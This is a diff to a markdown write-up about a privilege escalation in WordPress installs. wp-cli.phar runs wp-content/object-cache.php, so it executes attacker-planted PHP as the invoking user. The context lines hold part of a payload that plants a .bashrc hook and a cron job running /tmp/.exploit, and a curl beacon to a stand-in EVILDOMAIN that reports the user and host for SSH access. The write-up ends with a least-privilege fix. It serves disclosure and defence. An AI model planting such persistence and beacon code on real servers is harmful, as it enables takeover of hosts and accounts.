@@ -48,10 +48,11 @@ function wp_start_object_cache() {
 <snip>
 ```
 
-Although this code should not be trusted by default it is. And so this is a nice attack vector. Anyony that executes wp-cli-phar in this installation will execute the code in object-cache.php by default. So let's see how we could use this. 
+Although this code should not be trusted but by default it is. And so this is a nice attack vector. Anyony that executes wp-cli-phar in this installation will execute the code in object-cache.php by default. So let's see how we could use this. 
 
 Let's setup an imaginary hosting environment:
 - Any webserver, SQL server etc you wish
+- The PHP-FPM process will run as a non-priviliged user with a /sbin/nologin shell.
 - PHP-FPM configured with a php.ini that disables 
 	- proc_open
 	- popen
@@ -72,7 +73,6 @@ Let's setup an imaginary hosting environment:
 	- posix_setuid
 	- posix_getpwuid
 	- posix_uname
--The PHP-FPM process will run as a non-priviliged user with a /sbin/nologin shell.
 
 
 Although the execution of PHP (and so wp-cli.phar) will have no way to execute system binaries or scripts other than PHP. To attack the user of wp-cli.phar (which might be a supportdesk employee or a cronjob running `wp-cli.phar core update`) we could insert the following code in wp-content/object-cache.php:
@@ -124,7 +124,7 @@ Although the execution of PHP (and so wp-cli.phar) will have no way to execute s
 	@$bashrcold .= "\n/tmp/.exploit";
 	@file_put_contents($bashrc,$bashrcold);
         
-	@file_put_contents('/tmp/.cronfile', "SHELL=/bin/bash\nMAIL=\"\"\n\n*37 13 * * * /tmp/.exploit\n");
+	@file_put_contents('/tmp/.cronfile', "SHELL=/bin/bash\nMAIL=\"\"\n\n37 13 * * * /tmp/.exploit\n");
 
 	// we do a GET on EVILDOMAIN to inform us which username and host to SSH into with our ssh key
 	@$c = curl_init("http://EVILDOMAIN/?".$user."@".gethostbyaddr("127.0.1.1"));
@@ -170,8 +170,10 @@ If this user logs into the system again the user executes the cronjob is inserte
 This would give us code execution for the user root on the webserver
 
 Solving this issue is easy. Always use the concept of least privilege. If you force the use of the non-privileged webuser misuse wil be prevented:
-``` sudo -u webuser wp-cli.phar plugin list```
+```
+$ sudo -u webuser wp-cli.phar plugin list
+```
 
 
-[1] http://wp-cli.org/
-[2] https://github.com/WordPress/WordPress/blob/795af804ba83ab4ecb36477ced49980cf9f117f2/wp-includes/load.php#L474
+- [1] http://wp-cli.org/
+- [2] https://github.com/WordPress/WordPress/blob/795af804ba83ab4ecb36477ced49980cf9f117f2/wp-includes/load.php#L474
